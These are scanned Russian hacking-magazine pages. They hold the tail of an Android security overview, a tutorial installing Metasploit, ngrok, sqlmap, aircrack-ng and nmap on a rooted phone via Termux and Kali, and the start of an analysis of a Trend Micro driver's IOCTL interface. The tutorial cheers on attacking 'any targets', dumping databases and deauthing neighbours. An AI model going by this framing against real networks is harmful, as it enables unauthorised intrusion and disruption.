Это мало, даже если учитывать, что Google не может применять для обна‐
ружения такие же эвристичес кие алго ритмы, как у дру гих антивирусов (боль‐
шинство антивирусов считают подозрительными даже при ложе ния, имеющие
права на отправку СМС).


SMART LOCK
Сегодняшний пользователь привык к датчикам отпечатков пальцев и сканиро‐
ванию лица для разблокировки смартфона, но шесть лет назад заставить
пользователя защитить смартфон с помощью PIN‐кода или пароля было
сложно. Поэтому инженеры Google соз дали не самую надежную (а в некото‐
рых случаях и совсем ненадежную), но действенную систему под названием
Smart Lock.
  Появившийся в Android 5 Smart Lock — это механизм для автомати ческого
отключения защиты экрана блокировки после подклю чения к одному из Blue‐
tooth‐устройств (умные часы, автомагнитола, TV box) на основе местополо‐
жения или по снимку лица. Фактически это официальная реализация фун‐
кций, которые неофициально были дос тупны в сторонних приложениях (нап‐
ример, SWApp Link для раз блокировки с помощью часов Pebble) и прошивках
от производителей (мотороловский Trusted Bluetooth).
   Теперь функциональность этих приложений доступна в самом Android,
а все, что остается сделать пользователю, — уста новить на экран блокировки
PIN‐код, ключ или пароль, активировать Smart Lock в нас тройках безопас‐
ности и добавить доверенные Bluetooth‐устройства, мес та и лица.
  По словам Google, Smart Lock поз волил поднять уровень использования
паролей для блокировки экрана среди пользователей в два раза. Однако сто‐
ит иметь в виду, что из всех методов раз блокировки, доступных в Smart Lock,
более‐менее надежным мож но считать только разблокировку с помощью
устройства Bluetooth. И это только в том случае, если твоя цель — защитить
украденное устройство, а не отстаивать перед полицейским свое право
на частную жизнь.





                      Нас трой ки Smart Lock

Итого: сегодня Android использует три вида разблокировки экрана с разным
уровнем надежности и, соответственно, уровнем дос тупа:
 1. Пароль или PIN‐код — считается наиболее надежным и поэтому дает пол‐
  ный контроль над устройством безо вся ких огра ничений.
 2. Отпечаток пальца или снимок лица — менее надежный, система зап‐
  рашивает пароль после каждой перезагрузки телефона, а также через
   каждые 72 часа.
 3. Smart Lock — наименее надежный метод, поэто му на него накладываются
   те же ограничения, что и на биометрический метод, плюс он не поз воляет
   получить доступ к аутентифика ционным ключам Keymaster (например, тем,
   что   используются   для   платежей),   а   пароль   запрашивается
   не через 72 часа, а уже через четыре.


WEBVIEW
С первых версий Android включал в себя компонент WebView на базе WebKit,
позволяющий  сторонним  приложениям  исполь зовать  HTML/JS‐движок
для отображения контента. На нем же базировалось большинс тво сторонних
браузеров.
  В Android 4 WebView был серьезно модернизирован и заменен движком
из проекта Chromium (версия 33 в Android 4.4.3). С пятой версии WebView
не просто базируется на Chromium, а еще и умеет обновляться через Google
Play (в автоматическом режиме, незамет но для пользователя). Это значит,
что Google может закрывать уязвимости в движ ке так же быс тро, как уяз‐
вимости в Google Chrome для Android. Все, что пот ребуется от пользовате‐
ля, — это подключенный к интернету смартфон с Android 5 или выше.





        Начиная с Android 5.0 WebView — это независимый пакет

С Android 8 рендерер‐процесс WebView изолирован с помощью seccomp. Он
работает в очень ограниченной песочнице, которая не допускает обращения
к постоянной памяти и сетевым функциям. Кроме того, WebView теперь также
может использовать технологию Safe browsing, знакомую всем пользовате‐
лям Chrome. Safe browsing предуп режда ет о потенциально небезопасных
сайтах и требует явно подтвердить переход на такой сайт.


SAFETYNET
Начиная с Android 7 в Google Play Services есть API под названи ем SafetyNet,
который выполняет одну прос тую задачу: про веря ет, ори гинальное ли устрой‐
ство (сверяет серийные номера), не была ли его прошивка изменена и есть
ли у пользователя права root. Используя этот API, раз работчики могут писать
приложения, которые в принципе не заработают на модифицированных про‐
шивках или,  к примеру, прошивках, давно не получавших исправления
безопасности (patch level).
  Долгое вре мя SafetyNet определял надежность устройства с помощью
эвристических методов, которые всегда можно было обмануть: Magisk
успешно скрывал наличие root и факт разблокировки загрузчика от SafetyNet
на протяжении несколь ких лет.
  С недав него времени SafetyNet перес тал полагать ся на простую проверку
состояния загрузчика (которую умеет обманывать Magisk), а вместо этого
использует приватный ключ шифрования из защищенного хранилища Key‐
Store, чтобы подтвердить достоверность переданных данных. Обойти эту
защиту можно, лишь получив доступ к приватному ключу, который хранится
в выделенном криптографичес ком соп роцессоре (TEE), а сделать это прак‐
тически невозможно.
  Все это означает, что совсем ско ро все сертифицированные Google
устройства на базе Android 8 и выше просто перес танут проходить проверку
SafetyNet и Magisk будет бесполезен при работе с банковскими клиентами
и другими приложениями, использующи ми SafetyNet.





       Проверка устрой ства с помощью приложения SafetyNet Test


Kill Switch
В августе 2013 года Google запустила веб‐сервис Android Device Manager,
с помощью которого пользователи получи ли воз можность заблокировать
смартфон или сбросить его до заводских настро ек. В качестве клиентской
части на смартфо не сервис использовал обновляемый через Google Play
компонент Google Play Services, поэтому функция стала доступна для любых
устройств начиная с Android 2.3.
  С Android 5 в сервис также вклю чена функция Factory Reset Protection. Пос‐
ле ее активации возможность сбро са до заводских нас троек будет заб‐
локирована паролем,  что, по мнению Google, помешает пол ноценному
использованию смартфона или его про даже. Ведь однажды привязанный
к аккаунту Google смартфон уже не может быть отвя зан без сброса нас троек.
  Проблема здесь только в том, что загрузчик большинства смартфонов
можно разблокировать вполне официально. А после этого его можно пол‐
ностью перепрошить.





                 Нас трой ки Android Device Manager


ВЫВОДЫ
Усилия Google в ито ге дали результат. Большую часть уязвимостей в смар‐
тфонах теперь находят не в самом Android, а в драйверах и прошивках кон‐
кретных устройств. По общему количеству уяз вимос тей Android уже пле тется
позади iOS, а цены за сами уязвимости в Android пре высили цены за уяз‐
вимости в iOS.
  Современный смартфон на Android (если, конечно, это не китайский шир‐
потреб) неприступен практически со всех сторон. С него не получится снять
дамп  памяти,  его  нельзя  окирпичить, выполнить  даунгрейд,  взломать
с помощью обхода экра на бло кировки. Ослабить всю эту систему защиты
способен лишь сам произво дитель устройства.
COVERSTORY


                          ДЕЛАЕМ
                    ИЗ УСТРОЙСТВА
                       С ANDROID
                         «ХАКЕРФОН»
                     С ПОМОЩЬЮ
                       TERMUX И KALI





                                                                                   Ghoustchat
                                                                                    aio02012003@gmail.com

       БОЕВОЙ
     СМАРТФОН



Все мы  видели  в  фильмах  о  хакерах  сцены  взлома
с помощью мобильных телефо нов. Обычно все, что там тво‐
рится, — выдумка. Однако и эта выдумка медленно, но верно
становится  реальностью. Из  этой  статьи  ты  узнаешь,
как приблизиться к кино и превратить свой телефон в нас‐
тоящий хакерский инструмент.


ЧТО НУЖНО ЗНАТЬ И СДЕЛАТЬ ПЕРЕД УСТАНОВКОЙ
Первое, о чем следует позабо титься, — это пра ва root. Без них некоторые
функции установленных нами утилит могут не поддержи ваться или работать
некорректно. Поэто му нас тоятельно рекомендую их заполучить. Особенно
это касается пользователей с Android 10 и более поздних версий.
  Получение root в каждом случае уникально, ведь оно напрямую зависит
от конкретной модели устройства и версии Android. Я в этой статье буду
использовать свой старенький Samsung Galaxy S6 (SM‐G920F) на Android 7.0
Nougat, для рута в котором уже есть специальный инструмент. В остальных
случаях придется погуглить и узнать, как получить рут конкретно на твоем
устройстве. На форуме 4PDA почти всегда есть нужная инструкция.
   Также нам понадобится Termux — простой и удоб ный терминал, дающий
многие возможности среды Linux, который и позволит исполнять наши коман‐
ды в подходящей среде и не возиться с предварительной настройкой окру‐
жения.
  Рекомендую также уста новить утилиту tsu, которая пре дос тавит тебе воз‐
можность выполнять команды от рута. Если она не работает должным обра‐
зом, загляни в GitHub‐репозиторий, который настраивает работу рута в Ter‐
mux. Это нужно, чтобы Termux сразу имел рут‐дос туп, который может понадо‐
биться для дальнейших операций.


             INFO

                    Важный момент: при использовании в качестве
                        рута Magisk  (а на большинстве современных
                        устройств альтернатив нет и не предвидится)
                      не забудь в его настройках разрешить Termux
                        рут‐доступ,  а  также  добавить  в  исключения
                       для Magisk Hide, иначе все наши действия будут
                      бесполезны.


Также рекомендую обно вить список пакетов, как мы обычно делаем это в
десктопе Kali:


$ apt‐get update


Пара слов о Kali NetHunter
Если ты один из тех счас тливчиков, чье устрой ство оказалось в списке под‐
держиваемых, рекомендую попробовать Kali NetHunter. Это платформа, соз‐
данная разработчиками Kali Linux специально для телефонов на Android.
В NetHunter сразу доступно много рабочего софта из десктопной версии Kali.
Образы можно найти на официальном сайте. Это более мощ ный набор, чем
тот, что ты можешь получить с помощью Termux.
  Подробнее о Kali NetHunter читай в статье «Атака со смартфона: зна‐
комимся с Kali NetHunter».



УСТАНАВЛИВАЕМ METASPLOIT
Полное описание Metasploit — тема для отдель ной статьи, поэтому пройдем‐
ся по нему вкратце. Metasploit Framework — фреймворк, предназначенный
для создания, отладки и, конечно, применения экспло итов.
   Установить Metasploit Framework (MSF) на Android 7 или выше можно в две
команды:


$ pkg install unstable‐repo
$ pkg install metasploit

На Android 5.x.x–6.x.x MSF устанавлива ют несколько дру гим методом:


$ curl ‐LO https://github.com/termux/termux‐packages/files/3995119/
metasploit_5.0.65‐1_all.deb.gz
$ gunzip metasploit_5.0.65‐1_all.deb.gz
$ dpkg ‐i metasploit_5.0.65‐1_all.deb
$ apt ‐f install


           WARNING

                     Все эти команды сле дует выполнять с правами
                     обычного пользователя, если не оговорено иное:
                      при выполнении от рута могут возникать труд‐
                      ноисправимые проблемы.
                    В  частности, при  запуске  apt  от  рута мы
                      получим сбитые кон тексты SELinux, что потом
                    помешает нам устанавливать пакеты.


Установка может затянуть ся. Не закрывай сессию Termux до конца установки
MSF!


           WARNING

                    Не стоит обновлять MSF вручную редактирова‐
                     нием $PREFIX/opt/metasploit, так как это
                     может привести к проблемам с зависимостями.


Теперь, чтобы убедиться, что у нас все работает, запустим Metasploit:


$ msfconsole





                             Metasploit Framework

Как видишь, все отлично и в твоем рас поряжении 2014 экс плоитов. :)


УСТАНАВЛИВАЕМ NGROK
Ngrok — это кросс‐платформен ный софт для соз дания защищенных сетевых
туннелей  от обще дос тупной  конечной  точки до  локально работающей
сетевой службы. Также утилита собира ет весь тра фик и логирует его для ана‐
лиза.
  Перед дальнейшими действиями убедись, что интернет подключен (через
«мобильные данные») и активирована точка дос тупа, так как это необходимо
для корректной работы ngrok.
  Для начала обновляемся и ста вим Python 2:


$ pkg update && pkg upgrade && pkg install python2

Теперь нам нужно зарегистрировать свой аккаунт ngrok.
   Как только зарегистрируешься, тебя перебросит на страницу личного
кабинета, где нужно будет найти и скопировать свой токен аутентификации,
как показано на скриншоте.





                           AuthToken for ngrok

Далее надо скачать архив с ngrok для Linux‐based‐систем с архи тек турой
ARM.





                          Download ngrok

Дальше заходи в Termux и иди в ту директорию, куда скачал архив с ngrok.
К примеру:


$ cd /sdcard/Downloads

Введи команду ls |grep ngrok и проверь, что архив здесь. Теперь нам нуж‐
но разархивировать его:


$ unzip ngrok‐stable‐linux‐arm.zip

После этого еще раз введи ls |grep ngrok и проверь, появился ли у тебя
исполняемый файл ngrok. Если его нет, то перед следующим шагом зайди
в директорию с ним:


$ cd ngrok‐stable‐linux‐arm

И перемести исполняемый файл в домашний каталог Termux:


$ mv ‐v ngrok /$HOME

Посмотри, куда был перемещен файл, и отправляй ся туда с помощью команд
cd и ls.
   Теперь тебе нужно установить флаг исполнимос ти файла:


$ chmod +x ngrok

И сделать первый запуск:


$ ./ngrok

Помнишь, ты копировал свой токен для аутентифика ции? Впи ши эту команду,
чтобы ngrok знал, кто его использует:


$ ./ngrok authtoken токен

И запускай сервер:


$ ./ngrok http 80

Ты увидишь экран как на скриншоте.





                                Ngrok

Отлично, теперь ты готов ата ковать любые цели! :)


УСТАНАВЛИВАЕМ SQLMAP
Цитата с официального сайта: «Sqlmap — это инс трумент для тестирования
на проникновение с открытым исходным кодом, который автоматизиру ет
обнаружение и исполь зование недос татков SQL‐инъ екций и захват серверов
баз данных».


             INFO

                     Подробнее  о  sqlmap  ты  можешь  прочесть
                        в архивной статье 2011 года «Sqlmap: SQL‐инъ‐
                       екции — это просто».


С установкой все эле ментарно. Перед тобой есть выбор: поставить стабиль‐
ную версию 1.4.3 или самую новую 1.4.5.34. Первая ставится проще некуда:


$ pkg install sqlmap

И все. Чтобы запустить утилиту, пропиши команду


$ sqlmap ‐u <URL>





                           Sqlmap 1.4.3

Или  же  ты можешь  пос тавить  себе  более  новую  версию,  которая
еще находится в разработке. Для этого нужно клонировать официальный
проект sqlmap с GitHub:


$ git clone https://github.com/sqlmapproject/sqlmap.git

Далее переходи в папку с sqlmap:


$ cd sqlmap

И, используя python2, запус кай sqlmap с таким же обязательным парамет‐
ром:


$ python2 sqlmap.py ‐u ссылка





                          Sqlmap 1.4.5.34

Теперь больше половины баз данных интернета могут оказаться в твоем
смартфоне! Но не забывай, что, применяя этот мощ ный инстру мент, ты рис‐
куешь нажить проб лемы с законом.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
  БОЕВОЙ СМАРТФОН
               ДЕЛАЕМ ИЗ УСТРОЙСТВА С ANDROID
            «ХАКЕРФОН» С ПОМОЩЬЮ TERMUX И KALI





УСТАНАВЛИВАЕМ AIRCRACK-NG
Aircrack‐ng — набор утилит, предназначенных для обнаружения бес провод‐
ных  сетей, перех вата  их  трафика и аудита клю чей шифрования WEP
и WPA/WPA2‐PSK.
   Здесь уже все далеко не так прос то. Думаю, ты слышал, насколько трудно
перевести Wi‐Fi‐адаптер смартфона в режим мониторинга. В официальных
репозиториях Termux на этот случай есть пакет утилиты iwconﬁg, которая
управляет беспроводными сетями. Нам надо ее установить.
  Для начала нужны вспомога тельные ути литы:


$ pkg install root‐repo

Теперь можно ставить iwconﬁg с остальными тулзами для работы с беспро‐
водными сетями:


$ pkg install wireless‐tools

И еще поставить отдельно iw:


$ pkg install iw

Теперь тебе надо будет зайти как рут и создать экземпляр монитора. Для это‐
го мы сделаем так:


$ tsu
$ iw phy0 interface add mon0 type monitor

Проверим наши адаптеры и их статусы:


$ iwconfig

Если что‐то отображается не так, проверь, работает ли Wi‐Fi, и убедись, что
он не подключен к каким‐либо сетям.
  Далее нам нужно поднять наш монитор:


$ ifconfig mon0 up

Конечно, не все устрой ства с Android поддерживают режим мониторинга.
Проверить это можно приложением bcmon, которое среди прочего умеет
вклю чать режим мониторинга на совместимых чипах Broadcom (это устрой‐
ства Nexus и некоторые другие). Для всех остальных придется купить
переходник USB — OTG, в который воткнуть один из под держиваемых дес‐
ктопной Kali адаптеров. Для этого понадобится пересобрать ядро с нужными
драйверами. Если у тебя нет опыта пересборки ядра, рекомендую обратиться
в тему своего устрой ства на 4PDA или XDA‐developers. Часто там есть сбор ки
Kali с уже готовым ядром.
   Теперь можем ставить aircrack‐ng:


$ pkg install aircrack‐ng

Смотрим короткий man:


$ man aircrack‐ng





                                  Aircrack‐ng

И можем запустить airodump‐ng:


$ airodump‐ng ‐i mon0

Теперь можно перехватывать тра фик открытых точек, спамить deauth‐фрей‐
мами, отключая неугод ных соседей посторон ние устрой ства от интерне та,
ловить хендшейки для взло ма паролей. Не мне тебя учить.


УСТАНАВЛИВАЕМ NMAP
Nmap — утилита, предназначенная для сканирования сетей. Может находить
открытые порты, делать трассировку, проверять на уязвимости с помощью
NSE‐скриптинга. Чтобы лучше ознакомиться с этим приложением, стоит про‐
читать две статьи из нашего журнала о NSE‐скриптинге и его использовании
для обхода файрволов, DoS‐атак и многого другого.
  В нашем случае возможнос ти Nmap могут быть немного уре заны, ведь
используем портированную на Android версию. Однако она есть в официаль‐
ных репозиториях Termux, что упрощает нам жизнь:


$ pkg install nmap

Посмотрим короткий man:


$ nmap





                         Nmap

Для интенсивного сканиро вания я использую такие параметры:
   $ nmap ‐T4 ‐A ‐v


СТАВИМ НА ТЕЛЕФОН ПОЛНОЦЕННЫЙ KALI LINUX
На некоторые телефо ны можно установить Kali NetHunter, но речь сейчас пой‐
дет не о нем. Мы будем ста вить образ полноценной Kali на наш телефон
и подключаться к его десктопу через VNC. У тебя будет образ именно Kali Lin‐
ux, что позволит поль зоваться теми прогами, которые не удается завес ти
на Termux (к примеру, BeEF‐XSS).
  Сначала нам понадобится ска чать из Google Play установщик урезанных
дистрибутивов — Linux Deploy, набор необходимых пакетов для корректной
работы (BusyBox) и, конечно, VNC Viewer — клиент VNC. Не важно, что
в реальности эта машина будет находиться на 127.0.0.1.
   Также из интернета нужно скачать об раз Kali для Android. Лично я скачивал
полную версию с файловой системой ext4, которая подходит для архи тектуры
ARM (пятый файл сверху). Когда архив докачается, твоя задача — извлечь
оттуда образ объемом 5,5 Гбайт и поместить его в директорию /storage/
emulated/0 мобильного устрой ства. После этого переиме нуем файл в lin‐
ux.img.
   Теперь нужно уделить внимание BusyBox. Сейчас в Google Play очень мно‐
го вариантов разных про изво дителей. Дело в том, что некоторым устрой‐
ствам приходится подыскивать нуж ный BusyBox, чтобы все утилиты пос‐
тавились коррек тно. В моем случае подошел са мый популярный пакет Busy‐
Box Free, файлы которого я установил в /su/xbin. Запомни эту директорию,
она важна при обновлении среды установщика.
   Теперь заходим в Linux Deploy и справа внизу нажимаем на иконку настро‐
ек дистрибутива. Выбира ем дистрибутив Kali Linux. Нужная архи тектура выс‐
тавится автоматически, но, если не получится, попробуй armhf.





                                    Settings

Далее измени пароль пользователя, он находится ниже.
  И в самом конце ты найдешь пункты, отвечающие за включение серверов
SSH и VNC. Поставь галочки напротив них. Если не нужна графическая среда,
то будет достаточно SSH. Потом можно будет скачать любой клиент SSH
и подключаться к нашей машине с Kali по 127.0.0.1. Чтобы не качать лишние
приложения, можешь воспользоваться обычным openssh‐client пря мо
в Termux, для чего просто открой еще одну вкладку.
   Если же тебе все же нужна гра фическая среда, то включи соответству‐
ющий пункт, и дальше я покажу, как подключиться к десктопу Kali по VNC.





                       SSH and VNC

Теперь нужно настроить рабочее окру жение. В нас тройках переменной PATH
укажи тот путь, куда BusyBox уста навливал пакеты.





                        SSH и VNC

И обнови рабочее окружение (кнопка ниже).
  Далее нужно настроить наш контейнер. Выйди на главную страницу, в пра‐
вом верхнем углу нажми на иконку меню и выбери пункт «Сконфигурировать».
  Осталось только запустить наш контейнер. Жми кнопку Start внизу. Про‐
верь, нет ли при запуске контейнера стро чек с пометкой fail. Если есть, убе‐
дись, что ты правильно ука зал PATH рабочего окружения и сконфигури ровал
контейнер. Если все так, то попробуй сменить архитектуру на armhf и сделать
все заново.
   Теперь заходи в VNC Viewer или другой клиент VNC, добавляй соединение
по локалхосту (127.0.0.1) и называй его. Далее подключайся, подтверждай,
что хочешь продол жить  пользовать ся незашифрованным соединени ем,
и вводи пароль поль зователя, который ты указывал в Linux Deploy.
   Готово!





                                       Kali и Nmap

Конечно, дистрибутив ста рый, но весь софт рабочий, и, как видишь, тот же
Nmap функционирует без ошибок.
  Для теста я исполь зую команду


$ nmap ‐A ‐v <IP>

Параметр ‐A отве чает за включение ска нирования ОС, ее версии, сканиро‐
вания скриптами, а также трас сировку маршру та (traceroute). Параметр ‐v
выводит более подробную информа цию.
  Вывод результатов ска нирования ты можешь видеть на скриншоте ниже.





                       Nmap results


ЗАКЛЮЧЕНИЕ
Теперь твое пор тативное устройство способно вскрывать базы данных, ска‐
нировать сети, перехватывать тра фик и устра ивать еще множес тво разных
интересных атак. Используй эти воз можнос ти с умом!
ВЗЛОМ

  ОПАСНЫЙ
   ТРЕНД





       КАК УТИЛИТА TREND MICRO
      ДЛЯ БОРЬБЫ С РУТКИТАМИ
     ПОЗВОЛИЛА УСТАНАВЛИВАТЬ
              РУТКИТЫ





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru





18 мая 2020 года восемнадцатилетний иссле дователь Билл
Демиркапи опубликовал в сво ем бло ге объемное иссле‐
дование, посвященное очень любопытной теме. Автору уда‐
лось установить в Windows собственный руткит с помощью
утилиты RootkitBuster компании Trend Micro. Рассказ о том,
как молодой исследователь пришел к успе ху, — в сегод‐
няшней статье.


Изучая методы обнаружения руткитов, Билл Демиркапи наткнулся на бесплат‐
ную утилиту RootkitBuster компании Trend Micro. Разработчик позиционирует
ее как сканер скрытых файлов, записей реес тра и master boot record (MBR),
предназначенный для идентификации и удаления руткитов. Опи сание прог‐
раммы гласило, что RootkitBuster способен выявлять несколько методов про‐
никновения руткитов и закрепления их в системе. Это заинтересовало иссле‐
дователя, и он решил выяс нить, что у RootkitBuster спрятано под капотом.
Пристальное изучение программы поз волило обна ружить примечательную
дыру в коде, с помощью которой можно исполь зовать тул зу не только
для поиска прячущихся в глубинах Windows вредоносов, но и для установки
в систему собственных руткитов.


        WWW

                      Эта  статья опирается на оригинальный  текст
                       исследования Билла Демиркапи. Если ты в дос‐
                         таточной сте пени владеешь английским языком,
                         то можешь ознакомиться с ним в его блоге.



УСТАНОВКА
Сразу после запуска инсталлятора RootkitBuster Билл обратил вни мание
на предупрежде ние Process Hacker о том, что софтина пытается установить
в его систему файл tmcomm.sys — драйвер, используемый некоторыми при‐
ложениями Trend Micro.





  RootkitBuster устанавливает драйвер до того, как пользователь примет
  условия лицензионного соглашения (здесь и далее иллюстрации из бло‐
  га Билла Демиркапи)

Примечательно, что драйвер и сам исполняемый файл сканера были рас‐
пакованы на диск в папку %TEMP%\RootkitBuster еще до того, как на экране
Билла появился текст лицензионного соглашения. Оно, в частнос ти, гласило,
что пользователь RootkitBuster обязуется «не пытаться перепроектировать,
модифицировать,  дизас семблировать,  декомпилировать,  исследовать
исходный код или создавать производные произведения на основе этой
программы».
  Поэтому Билл взял и завершил про цесс инсталлятора с помощью пункта
«Закрыть окно» контекстно го меню, так и не при няв условия лицензии. Что
позволило ему с чистой совестью «дизассемблировать, декомпилировать»
и делать с этим продуктом Trend Micro другие вещи, о которых в приличном
обществе не принято говорить вслух. Отличный трюк для обхода юридических
сложностей!


ДРАЙВЕР TMCOMM.SYS
Этот драйвер, обозначенный как Common Module Trend Micro, способен при‐
нимать сообщения от привилегированных приложений пользовательского
режима и может выполнять функции, специфичные не только для утилиты
RootkitBuster. Иными словами, он использует ся многими дру гими программа‐
ми Trend Micro.
  В  числе первых действий драйвер  соз дает  устройство по адресу
\Device\TmComm  для  приема  сооб щений  IOCTL  из  пользовательского
режима. Для этого устройства соз дается символичес кая ссылка по адресу
\DosDevices\TmComm (которая дос тупна через \\.\Global\TmComm). Точка
входа инициализирует зна чительное количество используемых в драйвере
классов и структур, однако для целей исследования — выполнения кода
ядра — нет необходимос ти подробно рас сматривать каждый из них.





            Создание устрой ства в драйвере tmcomm.sys

Билл обратил внимание на то обстоятельство, что для использования соз‐
данного драйвером виртуального устройства необ ходимо обладать привиле‐
гиями SYSTEM, то есть как минимум иметь в системе права админис тратора.
Это значительно сужает воз можнос ти исполь зования потенциальных уяз‐
вимостей в драйвере, но не исключает их.


КЛАСС TRUEAPI
Один из наиболее зна чимых компонентов драйвера — класс TrueApi,
который создается в точке входа и содержит указатели на импорти руемые
функции, используемые драйвером. Структура это го класса выглядит сле‐
дующим образом:


struct TrueApi
{
    BYTE Initialized;
    PVOID ZwQuerySystemInformation;
    PVOID ZwCreateFile;
    PVOID unk1; // Initialized as NULL
    PVOID ZwQueryDirectoryFile;
    PVOID ZwClose;
    PVOID ZwOpenDirectoryObjectWrapper;
    PVOID ZwQueryDirectoryObject;
    PVOID ZwDuplicateObject;
    PVOID unk2; // Initialized as NULL
    PVOID ZwOpenKey;
    PVOID ZwEnumerateKey;
    PVOID ZwEnumerateValueKey;
    PVOID ZwCreateKey;
    PVOID ZwQueryValueKey;
    PVOID ZwQueryKey;
    PVOID ZwDeleteKey;
    PVOID ZwTerminateProcess;
    PVOID ZwOpenProcess;
    PVOID ZwSetValueKey;
    PVOID ZwDeleteValueKey;
    PVOID ZwCreateSection;
    PVOID ZwQueryInformationFile;
    PVOID ZwSetInformationFile;
    PVOID ZwMapViewOfSection;
    PVOID ZwUnmapViewOfSection;
    PVOID ZwReadFile;
    PVOID ZwWriteFile;
    PVOID ZwQuerySecurityObject;
    PVOID unk3; // Initialized as NULL
    PVOID unk4; // Initialized as NULL
    PVOID ZwSetSecurityObject;
};

Если взглянуть на эту структуру внимательно, ста новится очевидно, что она
используется в качестве альтернативы прямому вызову функций. Билл пред‐
положил, что программы Trend Micro кеширу ют эти импортируемые функции
в момент инициализации, чтобы избежать перехватов таблицы отложенного
импорта. При отложенном импорте прилинкованная DLL загружается только
тогда, когда приложение обращает ся к одной из содержащихся в ней фун‐
кций. Если в системе поселился руткит, способный перехватывать таблицу
импорта в момент загрузки драйвера, необходимо предусмотреть соответс‐
твующий защитный механизм.


КЛАСС XRAYAPI
В драйвере имеется еще один важный класс под названием XrayApi. Он
используется  для  дос тупа  к  нескольким  низ коуровневым  устройствам
и непосредственного вза имо действия с файловой сис темой. Этот класс
содержит структуру XrayConfig, в которой сосредоточена его основная кон‐
фигурация:


struct XrayConfigData
{
    WORD Size;
    CHAR pad1[2];
    DWORD SystemBuildNumber;
    DWORD UnkOffset1;
    DWORD UnkOffset2;
    DWORD UnkOffset3;
    CHAR pad2[4];
    PVOID NotificationEntryIdentifier;
    PVOID NtoskrnlBase;
    PVOID IopRootDeviceNode;
    PVOID PpDevNodeLockTree;
    PVOID ExInitializeNPagedLookasideListInternal;
    PVOID ExDeleteNPagedLookasideList;
    CHAR unkpad3[16];
    PVOID KeAcquireInStackQueuedSpinLockAtDpcLevel;
    PVOID KeReleaseInStackQueuedSpinLockFromDpcLevel;
    ...
};

В этой структуре среди прочего есть информация о расположении таких внут‐
ренних и недокументированных переменных в ядре Windows, как ExInitial‐
izeNPagedLookasideListInternal, IopRootDeviceNode, ExDeleteNPaged‐
LookasideList и PpDevNodeLockTree. Исследователь предположил, что
предназначение этого класса — получение пря мого дос тупа к низ коуров‐
невым устройствам в обход документированных (а следовательно, широко
известных вирусописателям) методов.


ЗАПРОСЫ IOCTL
Перед изучением возможнос тей и функций драйвера Билл Демиркапи уде лил
внимание  механизму  обработки  запросов  IOCTL.  Это  спе цифичные
для отдельных (преиму щественно низкоуровневых) устройств системные
вызовы ввода‐вывода, которые не могут быть реализованы с использованием
регулярных вызовов. В основной функции диспетчеризации драйвер Trend
Micro преобразует данные вместе с запросом IRP_MJ_DEVICE_CONTROL
в собственную структуру, которую исследователь назвал TmIoctlRequest:


struct TmIoctlRequest
{
    DWORD InputSize;
    DWORD OutputSize;
    PVOID UserInputBuffer;
    PVOID UserOutputBuffer;
    PVOID Unused;
    DWORD_PTR* BytesWritten;
};

Таким образом, отправка запросов IOCTL в драй вере tmcomm.sys реали‐
зована с помощью своеоб разных «таб лиц диспетчеризации», при этом
«базовая таблица» содержит код IOCTL и соответству ющую вспомогательную
функцию. Например, если необ ходимо отправить IOCTL‐запрос с кодом
0xDEADBEEF, драйвер сравнивает запрос с каждой строкой базовой таблицы
диспетчеризации и передает его только в том случае, если найдет сов‐
падение. Каждая запись в такой таб лице имеет структуру, подобную пред‐
ставленной ниже:


typedef NTSTATUS (__fastcall *DispatchFunction_t)(TmIoctlRequest *
IoctlRequest);


struct BaseDispatchTableEntry
{
    DWORD_PTR IOCode;
    DispatchFunction_t DispatchFunction;
};

После вызова функции DispatchFunction обычно верифицируются переда‐
ваемые дан ные — начиная с про верки nullptr и заканчивая проверкой вход‐
ных и выходных буферов. Эти «функции вспомогательной дис петче ризации»
затем выполняют другой поиск на осно ве кода, переданного в пользователь‐
ском буфере ввода, с целью найти соот ветс твующую запись во вспомога‐
тельной таблице. Такие записи используют структуру следующе го вида:


typedef NTSTATUS (__fastcall *OperationFunction_t)(PVOID InputBuffer,
 PVOID OutputBuffer);


struct SubDispatchTableEntry
{
    DWORD64 OperationCode;
    OperationFunction_t PrimaryRoutine;
    OperationFunction_t ValidatorRoutine;
};

Непосредственно перед вызовом модуля PrimaryRoutine, который выпол‐
няет запрошенное действие, функция SubDispatchTableEntry вызывает
ValidatorRoutine. Эта подпрограмма про веря ет входной буфер, то есть
проверяет данные, которые будут впос ледствии использоваться PrimaryRou‐
tine. Этот основной код выполняется только в том случае, если Validator‐
Routine успешно завершит провер ку.
   Изучая механизмы обработки зап росов IOCTL, Билл Демиркапи вни‐
мательно рассмотрел каждую запись базовой таблицы диспетчеризации
и хранящиеся там функции. Это, в свою очередь, поз волило определить наз‐
начение вспомогательных таблиц диспетчеризации.


IoControlCode == 9000402Bh
Первая из рассмотренных Биллом таблиц отвечает за взаимодействие с фай‐
ловой системой. Код для этой вспомога тельной таблицы диспетчеризации
получается путем разыменования DWORD из начала входного буфера. То
есть, чтобы определить, какую запись вспомогательной таблицы следует
выпол нить, в начале входного буфера нуж но поместить DWORD, соответству‐
ющий определенному опкоду. Для упрощения задачи исследователя раз‐
работчики из Trend Micro оставили в коде драйвера много отладочных строк,
с использованием которых Билл Демир капи сос тавил таблицу функций Pri‐
maryRoutine, хранящихся во вспомога тельной таб лице диспетчеризации,
и описал их назначение.


 Опкод   Фун кция PrimaryRoutine      Описание

                                    Вызывает NtCreateFile, все параметры опре‐  2713h       IoControlCreateFile
                                            деляются запросом

  2711h       IoControlFindNextFile             Возвращает STATUS_NOT_SUPPORTED

                                      Ничего не делает, всегда возвращает STATUS_
  2710h        IoControlFindFirstFile
                                       SUCCESS

                                    Вызывает ZwClose, все параметры определя‐  2712h       IoControlFindCloseFile
                                           ются запросом

                                        Создает новый FileObject и связывает с ним
  2714h       IoControlCreateFileIRP
                                       DeviceObject для запрошенного диска

                                      Ссылается на FileObject, используя HANDLE
  2715h      IoControlReadFileIRPNoCache       из запроса. Вызывает IofCallDriver и читает
                                              результат

                                           Удаляет файл, отправляя запрос IR
  2716h       IoControlDeleteFileIRP
                                       P_MJ_SET_INFORMATION

                                         Запрашивает размер файла, отправляя запрос
  2717h       IoControlGetFileSizeIRP
                                       IRP_MJ_QUERY_INFORMATION

                                            Устанавливает метаданные файла, отправляя
  2718h       IoControlSetFilePosIRP
                                             запрос IRP_MJ_SET_INFORMATION

  2719h       IoControlFindFirstFileIRP           Возвращает STATUS_NOT_SUPPORTED

  271Ah       IoControlFindNextFileIRP           Возвращает STATUS_NOT_SUPPORTED

